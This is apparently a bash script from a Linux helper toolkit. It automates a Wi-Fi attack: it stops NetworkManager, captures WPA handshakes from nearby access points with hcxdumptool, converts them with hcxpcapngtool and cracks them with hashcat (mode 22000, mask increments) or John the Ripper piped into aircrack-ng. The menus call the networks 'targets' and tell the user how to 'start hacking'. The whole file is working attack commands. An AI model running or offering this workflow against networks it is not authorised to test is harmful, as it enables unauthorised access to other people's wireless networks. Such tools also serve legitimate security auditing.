#!/bin/bash
scripts_dir="/opt/easy-linux"
set -e
# Version: 0.0.4
# trap "${scripts_dir}/support/support-trap-wifi.sh" EXIT
source "${scripts_dir}/.envrc"

ripper_func() {
  clear
  printf "\\n"

   # Prompt the user to choose between John the Ripper and Hashcat
  source "${scripts_dir}/support/support-Banner_func.sh"
  printf "${OG}    Step 4]  Select the cracking tool that you will use to crack the hash"
  printf "\\n"

  printf "${OG}1] ${CY}John the Ripper\\n"
  printf "${OG}2] ${CY}Hashcat ${WT}(recommended)${OG}\\n"
  printf "\\n"
  printf "$CY  Choose a tool for cracking the hash [1/2] ${GN}----> ${OG}\\n"
  printf "\\n"
  read -n 1 -r ripperchoice
  ripperchoice=${ripperchoice:-2}

  if [[ ${ripperchoice} == 1 ]]; then
    # Crack the hash with John the Ripper using the OneRuleToRuleThemAll.rule
    john --wordlist="${WORDLIST}" --rules="${RULES}" --stdout | aircrack-ng -w - -e SSID /opt/backup/root/handshakes/hashes.22000 -J /opt/backup/root/handshakes/mypots.potfile

  elif [[ ${ripperchoice} == 2 ]]; then
    # Crack the hash with hashcat
    hashcat -m 22000 -a 3 -w 4 -o /opt/backup/root/handshakes/mypots.potfile --force --opencl-device-types=1,2 "${WORDLIST}" /opt/backup/root/handshakes/hashes.22000 --increment --increment-min=10 --increment-max=13
  else
    # Invalid choice
    printf "${RED}  Invalid choice. Exiting...\\n"
    exit 1
  fi

}

full_scan() {
clear
source "${scripts_dir}/support/support-Banner_func.sh"

if ls ${scripts_dir}/support/hcxdumpfile* >/dev/null 2>&1; then
  printf "${GN}    Step 3]   Full scan on target.\\n"
  printf "${CY}  Whoop. How would you like to do a ${WT}REAL ${CY}scan.\\n"
  printf "${OG}    The longer you wait on the next screen, the more attacks will complete, and the\\n" 
  printf "${OG}    more hashes you will have. It will stop itself after 10 mins or you can press\\n"
  printf "${OG}    ${WT}Ctrl${OG} + ${WT}C ${OG}to stop it early.\\n    "
  read -n 1 -r -p "Good things come...Press any key "
  source ${scripts_dir}/support/support-hcxdump_full.sh
  sudo /usr/bin/hcxpcapngtool -o /opt/easy-linux/hcxdump_full.pcapng /opt/easy-linux/support/*.pcapng
  sudo cp ${scripts_dir}/support/hcxdump* ${scripts_dir}/
  sudo rm ${scripts_dir}/support/hcxdump*

  ripper_func
elif ls ${scripts_dir}/hcxdump_full* >/dev/null 2>&1; then
  printf "${GN}  So...you ran the full scan"; sleep 2; printf " ...I hope it paid off for you."; sleep 2; printf " You'll find out soon\\n  "
  sleep 3; printf "...ish\\n    "
  printf "  ${GN}Press ${WT}any ${GN}"
  read -n 1 -r -p "key to continue."
  printf "${CY}\\n"
  ripper_func
fi
}

Test_func() {
  clear
  source "${scripts_dir}/support/support-Banner_func.sh"
  printf "${GN}     Step 2]  What test do you want to run?\\n"
  printf "  \\n"
  printf "   ${OG}  1] ${CY}Injection Test - Test your network adapter's packet injection abilities.\\n"
  printf "   ${OG}  2] ${CY}Driver Test - Runs several tests to determine if the driver supports all IOCTL calls. \\n"
  printf "   \\n"
  printf "   ${OG}  99] ${CY}Return to the main menu.                       ${RED} [✘] Exit tool [✘]${CY}\\n "
  read -n 1 -r -p "Which test? " test

  if [[ ${test} = 1 ]]; then
    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant
    sudo hcxdumptool --check_injection -i "${adapter}"
  elif [[ ${test} = 2 ]]; then
    sudo systemctl stop NetworkManager
    sudo systemctl stop wpa_supplicant
    sudo hcxdumptool --check_driver -i "${adapter}"
  elif [[ ${test} = 99 ]]; then
    source "${scripts_dir}/install/menu-master.sh"
  elif [[ ${test} = "x" ]] || [[ ${test} = "X" ]]; then
    clear
    printf "    ${RED}0. [✘] Exit tool [✘]${NC} \\n"
    exit 0
  else
    printf "${RED}  Invalid Selection${NC}\\n"
  fi
}

scan_func() {
        if ls "${scripts_dir}/support/misc/hcxdump"* >/dev/null 2>&1 || ls "${scripts_dir}/support/hcxdump"* >/dev/null 2>&1; then
            if ls "${scripts_dir}/support/hcxdump"* >/dev/null 2>&1; then
              full_scan
            elif ! ls "${scripts_dir}/support/hcxdump"* >/dev/null 2>&1; then
             printf "${GN}    Step 2]  Initial target scan files detected.\\n"
             cd "${scripts_dir}/support/misc" || exit
             printf "${GN}  Hcxdump files exist in your misc/ directory. Using them.\\n"
             sleep 3
             sudo chown -vR $USER:0 "${scripts_dir}/support/misc"
             #sudo /usr/bin/hcxpcapngtool -o "${scripts_dir}/support/"*.pcapng*

             sudo /usr/bin/hcxpcapngtool -o /opt/easy-linux/support/hcxdump*.pcapng /opt/easy-linux/support/hcxdump*

             sudo cp ${scripts_dir}/support/misc/hcxdump* "${scripts_dir}/support/"
             sudo rm -f ${scripts_dir}/support/misc/hcxdump*
             read -n 1 -p "Done with hcxpcapng RCAScanning. Press any key. \\n"
             full_scan
            fi
      elif ! ls ${scripts_dir}/support/misc/hcxdumptool* >/dev/null 2>&1 || ! ls ${scripts_dir}/support/hcxdump* >/dev/null 2>&1; then
        # Code to execute when the files don't exist
           printf "${GN}    Step 2]  Initial scan for targets.\\n"
           printf "${OG}  You have selected scan. The next step will take 40 secs.\\n"
           printf "${OG}  Do ${WT}NOT ${OG}interrupt until the scan has completed.\\n  "
           read -n 1 -r -p "Press any key to continue." anykey2
           sudo systemctl stop NetworkManager
           sudo systemctl stop wpa_supplicant.service
           source "${scripts_dir}/support/support-hcxdump_dorcascan.sh"
           printf "\\n"
           sudo chown -vR $USER:0 "${scripts_dir}/support/misc"

           sudo /usr/bin/hcxpcapngtool -o /opt/easy-linux/support/hcxdump*.pcapng /opt/easy-linux/support/*.pcapng*
           # sudo /usr/bin/hcxpcapngtool -o ${scripts_dir}/support/hcxdumptool.pcapng* 
           sudo cp ${scripts_dir}/support/misc/hcxdump.* ${scripts_dir}/support
           sudo rm -f ${scripts_dir}/support/misc/hcxdump*
           full_scan
        fi
}

choice_func() {
  clear
  source "${scripts_dir}/support/support-Banner_func.sh"
  printf "${OG}   \\n"

  printf "  ${GN}  Step 1] Test wifi adapter capabilities or Scan for targets\\n"
  printf "  ${CY}On the next screen, you may be asked to pick which wifi adapter to use.\\n"
  printf "  ${CY}Your selected wifi adapter will be unavailable (no internet) while scanning.\\n"
  printf "  ${OG}You need to ${WT}pick Monitor mode ${OG}on the next screen to start hacking.${YW}\\n"
  #printf "  ${CY}Press ${WT}any${CY}"
  #  read -n 1 -r -p " key to continue. " pressany
  printf "\\n"
  printf " \\n${WT}"
  printf "${CY}  Now you decide, do we do our initial ${WT}[S]${CY}can for targets or \\n"
  printf "${WT}  [T]${CY}est your wifi adapter's monitor functions?\\n" 
  printf "  ${GN}Press ${WT}[T]${GN}est to test adapters or ${WT}[S]${GN}can to scan AP's.${WT} \\n     "

  read -n 1 -r -p "[T]est or [S]can [t/S] ----> " torscan
  torscan=${torscan:-S}
  printf "\\n"
  if [[ "${torscan}" = "T" ]] || [[ "${torscan}" = "t" ]]; then
    Test_func
  elif [[ "${torscan}" = "S" ]] || [[ "${torscan}" = "s" ]]; then
    printf " \\n"
    printf "${GN} \\n"
    scan_func
  else
     printf "${RED}Invalid Selection.  Valid options are T or S.\\n"
  fi
  }


main() {
#  source "${scripts_dir}/support/support-monitor.sh"
  # Capture the hashes with hcxdumptool

      source ${scripts_dir}/support/support-netadapter.sh

if ls ${scripts_dir}/hcxdump_* >/dev/null 2>&1; then
    ripper_func
elif ls ${scripts_dir}/support/hcxdump_full* >/dev/null 2>&1; then 
  sudo cp ${scripts_dir}/support/hcxdump_full* ${scripts_dir}/
  sudo rm ${scripts_dir}/support/hcxdump_full*
  full_scan
elif ls ${scripts_dir}/support/hcxdump_* >/dev/null 2>&1 && ! ls ${scripts_dir}/hcxdump_* >/dev/null 2>&1; then
    full_scan
elif ls ${scripts_dir}/support/misc/hcxdump* >/dev/null 2>&1; then
  sudo cp ${scripts_dir}/support/misc/hcxdump* ${scripts_dir}/support
  sudo rm ${scripts_dir}/support/misc/hcxdump*
    scan_func

elif ! ls ${scripts_dir}/support/misc/hcxdump* >/dev/null 2>&1 || ! ls ${scripts_dir}/support/hcxdump* >/dev/null 2>&1 || ! ls ${scripts_dir}/hcxdump* >/dev/null 2>&1; then
    choice_func
else
    choice_func
fi
}

main
sleep 1
printf "    ${OG}Restarting NetworkManager and wpa_supplicant...\\n"
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant

